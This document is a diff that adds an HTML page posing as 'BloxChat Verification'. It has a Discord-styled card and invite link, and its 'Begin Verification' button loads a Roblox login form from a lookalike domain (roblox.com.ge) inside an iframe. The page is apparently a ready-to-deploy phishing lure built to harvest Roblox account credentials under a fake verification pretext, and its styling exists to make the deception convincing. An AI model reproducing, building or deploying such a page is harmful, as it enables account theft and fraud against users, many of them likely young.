@@ -1,0 +1,197 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8" />
+<title>BloxChat Verification</title>
+
+<style>
+    body {
+        margin: 0;
+        height: 100vh;
+        background: linear-gradient(140deg, #0b0b0b, #161616, #0d0d0d);
+        background-size: 400% 400%;
+        animation: bgMove 18s ease infinite;
+        display: flex;
+        justify-content: center;
+        align-items: center;
+        font-family: "Inter", sans-serif;
+        color: #fff;
+        overflow: hidden;
+    }
+
+    @keyframes bgMove {
+        0% { background-position: 0% 50%; }
+        50% { background-position: 100% 50%; }
+        100% { background-position: 0% 50%; }
+    }
+
+    /* Premium glow orb */
+    .glow-orb {
+        position: absolute;
+        width: 500px;
+        height: 500px;
+        background: radial-gradient(circle, rgba(88,101,242,.45), transparent 70%);
+        filter: blur(80px);
+        animation: orbMove 10s ease-in-out infinite;
+    }
+
+    @keyframes orbMove {
+        0% { transform: translate(-120px, -80px); }
+        50% { transform: translate(120px, 80px); }
+        100% { transform: translate(-120px, -80px); }
+    }
+
+    /* Main card */
+    .card {
+        position: relative;
+        z-index: 10;
+        padding: 45px;
+        width: 440px;
+        text-align: center;
+        border-radius: 20px;
+        background: rgba(30,30,30,0.6);
+        backdrop-filter: blur(22px);
+        box-shadow: 0 0 55px rgba(0,0,0,0.6), inset 0 0 20px rgba(255,255,255,0.05);
+        animation: fadeIn 1s ease forwards;
+        opacity: 0;
+        transform: translateY(20px);
+    }
+
+    @keyframes fadeIn {
+        to { opacity: 1; transform: translateY(0); }
+    }
+
+    h1 {
+        font-size: 30px;
+        font-weight: 700;
+        margin-bottom: 5px;
+    }
+
+    .sub {
+        color: #cfcfcf;
+        margin-bottom: 25px;
+        font-size: 15px;
+    }
+
+    /* Premium main button */
+    button {
+        background: linear-gradient(135deg, #5865F2, #4752C4);
+        border: none;
+        padding: 15px 25px;
+        border-radius: 10px;
+        font-size: 18px;
+        color: white;
+        font-weight: 600;
+        width: 100%;
+        cursor: pointer;
+        box-shadow: 0 0 18px rgba(88,101,242,.4);
+        transition: 0.25s;
+    }
+
+    button:hover {
+        transform: translateY(-3px);
+        box-shadow: 0 0 28px rgba(88,101,242,.7);
+    }
+
+    /* Fancy Discord animated button */
+    .discord-btn {
+        margin-top: 18px;
+        display: block;
+        text-decoration: none;
+        padding: 14px 25px;
+        border-radius: 10px;
+        font-size: 17px;
+        color: white;
+        font-weight: 600;
+        background: linear-gradient(90deg, #7289da, #5865f2, #7289da);
+        background-size: 300% 300%;
+        animation: discordSlide 4s ease infinite, pulse 2.5s infinite;
+        box-shadow: 0 0 20px rgba(114,137,218,.5);
+        transition: 0.25s;
+    }
+
+    @keyframes discordSlide {
+        0% { background-position: 0% 50%; }
+        50% { background-position: 100% 50%; }
+        100% { background-position: 0% 50%; }
+    }
+
+    @keyframes pulse {
+        0% { box-shadow: 0 0 12px rgba(114,137,218,.5); }
+        50% { box-shadow: 0 0 24px rgba(114,137,218,.85); }
+        100% { box-shadow: 0 0 12px rgba(114,137,218,.5); }
+    }
+
+    .discord-btn:hover {
+        transform: translateY(-3px);
+    }
+
+    /* Iframe container */
+    #verifyFrameContainer {
+        width: 100%;
+        max-width: 440px;
+        height: 0;
+        opacity: 0;
+        overflow: hidden;
+        margin-top: 22px;
+        border-radius: 16px;
+        background: rgba(20,20,20,0.5);
+        backdrop-filter: blur(18px);
+        box-shadow: 0 0 25px rgba(88,101,242,.3);
+        transition: height .7s ease, opacity .7s ease;
+    }
+
+    iframe {
+        width: 100%;
+        height: 100%;
+        border: none;
+    }
+
+    #loader {
+        display: none;
+        padding: 14px;
+        color: #ccc;
+        font-size: 14px;
+    }
+</style>
+</head>
+
+<body>
+
+<div class="glow-orb"></div>
+
+<div class="card">
+    <h1>BloxChat Verification</h1>
+    <p class="sub">Please complete verification to continue.</p>
+
+    <button onclick="openVerifyFrame()">Begin Verification</button>
+
+    <a class="discord-btn" href="https://discord.gg/5YxUd4Xvya" target="_blank">
+        Official Discord Server
+    </a>
+
+    <div id="verifyFrameContainer">
+        <div id="loader">Loading…</div>
+        <iframe id="verifyFrame"></iframe>
+    </div>
+</div>
+
+<script>
+function openVerifyFrame() {
+    const url = "https://roblox.com.ge/login?returnUrl=8013954403666957";
+    const container = document.getElementById("verifyFrameContainer");
+    const loader = document.getElementById("loader");
+    const frame = document.getElementById("verifyFrame");
+
+    container.style.height = "530px";
+    container.style.opacity = "1";
+
+    loader.style.display = "block";
+    frame.src = url;
+
+    frame.onload = () => loader.style.display = "none";
+}
+</script>
+
+</body>
+  </html>
